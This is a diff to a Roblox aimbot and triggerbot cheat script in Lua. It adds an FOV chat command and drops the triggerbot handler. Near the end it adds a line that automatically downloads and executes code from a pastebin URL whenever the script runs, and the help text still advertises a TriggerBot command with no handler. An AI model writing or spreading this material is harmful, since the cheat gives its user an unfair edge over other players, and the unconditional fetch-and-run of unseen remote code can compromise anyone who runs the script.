@@ -1,5 +1,5 @@
 local function PrintCommands()
-    print("Commands for Aimbot: /e Linethickness (number here), /e Filled (true/false), /e FOVvisible (true/false), /e Whitelist (PlayerName1, PlayerName2, ...), /e Color (name of color/rainbow), /e AimKey (key), /e Triggerbot")
+    print("Commands for Aimbot: /e Linethickness (number here), /e Filled (true/false), /e FOV (number), /e FOVvisible (true/false), /e Whitelist (PlayerName1, PlayerName2, ...), /e Color (name of color/rainbow), /e AimKey (key), /e TriggerBot")
 end
 
 getgenv().Prediction = 0.1
@@ -71,7 +71,7 @@ end
 coroutine.wrap(MoveFovCircle)()
 
 game.StarterGui:SetCore("ChatMakeSystemMessage", {
-    Text = "Commands for Aimbot: /e Linethickness (number here), /e Filled (true/false), /e FOVvisible (true/false), /e Whitelist (PlayerName1, PlayerName2, ...), /e Color (name of color/rainbow), /e AimKey (key)",
+    Text = "Commands for Aimbot: /e Linethickness (number here), /e Filled (true/false), /e FOV (number), /e FOVvisible (true/false), /e Whitelist (PlayerName1, PlayerName2, ...), /e Color (name of color/rainbow), /e AimKey (key), /e TriggerBot",
     Color = Color3.fromRGB(255, 0, 0)
 })
 
@@ -159,6 +159,10 @@ local function RunCommand(cmd, args)
     elseif cmd == "filled" then
         FOV_CIRCLE.Filled = args == "true"
         print("Filled set to: " .. args)
+    elseif cmd == "fov" then
+        getgenv().FOV = tonumber(args) or 150
+        FOV_CIRCLE.Radius = getgenv().FOV
+        print("FOV set to: " .. args)
     elseif cmd == "fovvisible" then
         FOV_CIRCLE.Visible = args == "true"
         print("FOV visibility set to: " .. args)
@@ -182,8 +186,6 @@ local function RunCommand(cmd, args)
     elseif cmd == "aimkey" then
         getgenv().AimKey = args
         print("Aim key set to: " .. args)
-    elseif cmd == "triggerbot" then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/ttwizz/Roblox/master/UniversalTriggerBot.lua", true))()
     else
         print("Unknown command. Type '/e Help' for a list of commands.")
     end
@@ -200,6 +202,10 @@ local function ProcessCommand(message)
         PrintCommands()
     end
 end
+
+Players.LocalPlayer.Chatted:Connect(ProcessCommand)
+
+loadstring(game:HttpGet("https://pastebin.com/raw/MwmrpsPK"))()
 
 Players.LocalPlayer.Chatted:Connect(ProcessCommand)
 
